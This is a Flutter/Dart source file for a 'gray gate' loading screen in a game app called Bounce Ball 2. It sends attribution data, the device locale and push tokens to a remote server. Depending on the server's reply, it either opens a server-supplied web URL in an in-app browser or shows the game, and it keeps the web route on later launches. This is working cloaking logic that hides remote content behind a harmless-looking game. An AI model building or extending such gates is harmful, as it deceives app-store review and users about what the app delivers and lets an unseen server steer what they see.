import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';

import '../../app.dart';
import '../infra/ball_dispatch.dart';
import '../infra/ball_tap_bridge.dart';
import '../infra/ball_signal.dart';
import '../infra/ball_vault.dart';
import '../infra/flare_relay.dart';
import '../infra/net_probe.dart';
import '../models/ball_mode.dart';
import 'ball_browser.dart';
import 'no_net_screen.dart';
import 'notif_gate.dart';

enum _BarPhase { empty, midway, done }

/// ★ Core gray gate screen for Bounce Ball 2.
///
/// Shows the custom loading video while running attribution + config,
/// then routes to BallBrowser (gray) or the game (white).
class BounceGate extends StatefulWidget {
  final BallVault vault;
  final NetProbe probe;
  final BallSignal signal;
  final BallDispatch dispatch;
  final FlareRelay flare;

  const BounceGate({
    super.key,
    required this.vault,
    required this.probe,
    required this.signal,
    required this.dispatch,
    required this.flare,
  });

  @override
  State<BounceGate> createState() => _BounceGateState();
}

class _BounceGateState extends State<BounceGate> {
  VideoPlayerController? _vid;
  bool _vidReady = false;
  _BarPhase _bar = _BarPhase.empty;
  bool _navigated = false;
  Orientation? _lastOrientation;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp, DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft, DeviceOrientation.landscapeRight,
    ]);
    _boot();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final o = MediaQuery.of(context).orientation;
    if (o != _lastOrientation) { _lastOrientation = o; _switchVideo(o); }
  }

  Future<void> _switchVideo(Orientation o) async {
    final asset = o == Orientation.landscape
        ? 'assets/vt9k_seq/frame_wide.mp4'
        : 'assets/vt9k_seq/frame_tall.mp4';
    final old = _vid;
    final ctrl = VideoPlayerController.asset(asset);
    try {
      await ctrl.initialize();
      ctrl.setLooping(true);
      ctrl.setVolume(0);
      ctrl.play();
      if (!mounted) { ctrl.dispose(); return; }
      setState(() { _vid = ctrl; _vidReady = true; });
      old?.dispose();
    } catch (_) { ctrl.dispose(); }
  }

  void _setBar(_BarPhase p) { if (mounted) setState(() => _bar = p); }

  Future<void> _boot() async {
    widget.flare.onTokenRefresh = _onTokenRefresh;

    final nativeColdUrl = await BallTapBridge.consumeTapUrl();
    if (nativeColdUrl != null && nativeColdUrl.isNotEmpty) {
      await widget.vault.writeMode(BallMode.web);
      await widget.vault.consumeOneShotUrl();
      unawaited(_dispatchBackground());
      _goContent(nativeColdUrl);
      return;
    }

    _setBar(_BarPhase.empty);
    final mode = widget.vault.readMode();

    switch (mode) {
      case BallMode.web:
        _setBar(_BarPhase.midway);
        final pushFuture = widget.flare.bootstrap().catchError((_) {});
        await _handleWebMode(pushFuture: pushFuture);
        break;
      case BallMode.game:
        _setBar(_BarPhase.midway);
        unawaited(widget.flare.bootstrap().catchError((_) {}));
        final recovered = await _tryRecoverWebMode();
        if (recovered) return;
        _setBar(_BarPhase.done);
        await Future.delayed(const Duration(milliseconds: 600));
        _goGame();
        break;
      case BallMode.fresh:
        await widget.flare.bootstrap().catchError((_) {});
        await _handleFreshMode();
        break;
    }
  }

  @override
  void dispose() {
    widget.flare.onTokenRefresh = null;
    _vid?.dispose();
    super.dispose();
  }

  Future<void> _dispatchBackground() async {
    try {
      await Future.wait([
        widget.flare.bootstrap().catchError((_) {}),
        widget.signal.warmup().catchError((_) {}),
      ]);
      await Future.wait([
        widget.signal.awaitConversion(timeout: const Duration(seconds: 6)),
        widget.signal.awaitDeepLink(),
      ]);
      final body = await widget.signal.buildPayload(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.flare.token,
      );
      await widget.dispatch.send(body);
    } catch (_) {}
  }

  void _onTokenRefresh(String token) async {
    final body = await widget.signal.buildPayload(
      locale: Platform.localeName.replaceAll('-', '_'), pushToken: token);
    widget.dispatch.send(body);
  }

  Future<void> _handleFreshMode() async {
    _setBar(_BarPhase.empty);
    final online = await widget.probe.isOnline();
    if (!online) { if (mounted) _goOffline(fresh: true); return; }

    _setBar(_BarPhase.midway);
    await widget.signal.warmup();
    await Future.wait([widget.signal.awaitConversion(), widget.signal.awaitDeepLink()]);
    final body = await widget.signal.buildPayload(
      locale: Platform.localeName.replaceAll('-', '_'), pushToken: widget.flare.token);
    final reply = await widget.dispatch.send(body);

    if (reply.granted && reply.destination != null) {
      await widget.vault.writeMode(BallMode.web);
      _setBar(_BarPhase.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goContent(reply.destination!);
    } else {
      await widget.vault.writeMode(BallMode.game);
      _setBar(_BarPhase.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _goGame();
    }
  }

  Future<void> _handleWebMode({Future<void>? pushFuture}) async {
    final netFuture = widget.probe.isOnline();
    if (pushFuture != null) await Future.wait([netFuture, pushFuture]);
    final online = await netFuture;

    if (!online) {
      _setBar(_BarPhase.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goOffline(fresh: false);
      return;
    }

    final oneShotUrl = await widget.vault.consumeOneShotUrl();
    if (oneShotUrl != null) {
      _setBar(_BarPhase.done);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(oneShotUrl);
      return;
    }

    final signalFuture = widget.signal.warmup();
    final savedUrl = await widget.vault.readSavedUrl();
    await signalFuture;
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.signal.awaitDeepLink(),
    ]);
    final body = await widget.signal.buildPayload(
      locale: Platform.localeName.replaceAll('-', '_'), pushToken: widget.flare.token);
    final reply = await widget.dispatch.send(body);

    _setBar(_BarPhase.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (reply.granted && reply.destination != null) { _goContent(reply.destination!); return; }
    if (savedUrl != null) { _goContent(savedUrl); } else { _goOffline(fresh: false); }
  }

  Future<bool> _tryRecoverWebMode() async {
    final online = await widget.probe.isOnline();
    if (!online) return false;
    await widget.signal.warmup();
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.signal.awaitDeepLink(),
    ]);
    final body = await widget.signal.buildPayload(
      locale: Platform.localeName.replaceAll('-', '_'), pushToken: widget.flare.token);
    final reply = await widget.dispatch.send(body);
    if (!(reply.granted && reply.destination != null)) return false;
    await widget.vault.writeMode(BallMode.web);
    _setBar(_BarPhase.done);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _goContent(reply.destination!);
    return true;
  }

  void _goContent(String url) {
    if (_navigated) return;
    _navigated = true;
    final settle = Platform.isIOS;
    if (widget.vault.needsPushPrompt()) {
      widget.flare.shouldOfferConsent().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => NotifGate(
              vault: widget.vault,
              flare: widget.flare,
              probe: widget.probe,
              destination: url,
              onTokenReady: (token) async {
                final body = await widget.signal.buildPayload(
                  locale: Platform.localeName.replaceAll('-', '_'), pushToken: token);
                widget.dispatch.send(body);
              },
            ),
          ));
        } else {
          _directBrowser(url, layoutSettle: settle);
        }
      });
    } else {
      _directBrowser(url, layoutSettle: settle);
    }
  }

  void _directBrowser(String url, {bool layoutSettle = false}) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => BallBrowser(
        destination: url,
        vault: widget.vault,
        flare: widget.flare,
        probe: widget.probe,
        layoutSettle: layoutSettle,
      ),
    ));
  }

  void _goGame() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const ElementraApp()),
    );
  }

  void _goOffline({required bool fresh}) {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => NoNetScreen(
        probe: widget.probe,
        retryBuilder: (_) => BounceGate(
          vault: widget.vault, probe: widget.probe,
          signal: widget.signal, dispatch: widget.dispatch, flare: widget.flare,
        ),
      ),
    ));
  }

  String _barAsset() {
    switch (_bar) {
      case _BarPhase.empty:  return 'assets/vt9k_seq/meter_0.webp';
      case _BarPhase.midway: return 'assets/vt9k_seq/meter_1.webp';
      case _BarPhase.done:   return 'assets/vt9k_seq/meter_2.webp';
    }
  }

  @override
  Widget build(BuildContext context) {
    final barAsset = _barAsset();
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final barW = landscape
        ? (mq.size.height * 0.35).clamp(0.0, 160.0)
        : (mq.size.width * 0.70).clamp(0.0, 340.0);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          const ColoredBox(color: Colors.black),
          AnimatedOpacity(
            opacity: _vidReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 400),
            child: _vid != null && _vidReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _vid!.value.size.width,
                        height: _vid!.value.size.height,
                        child: VideoPlayer(_vid!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_vidReady)
            Positioned(
              left: 0, right: 0,
              bottom: landscape ? 0 : mq.padding.bottom,
              child: Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 300),
                  child: Image.asset(
                    barAsset,
                    key: ValueKey(barAsset),
                    width: barW,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    errorBuilder: (ctx, e, st) => const SizedBox(height: 32),
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
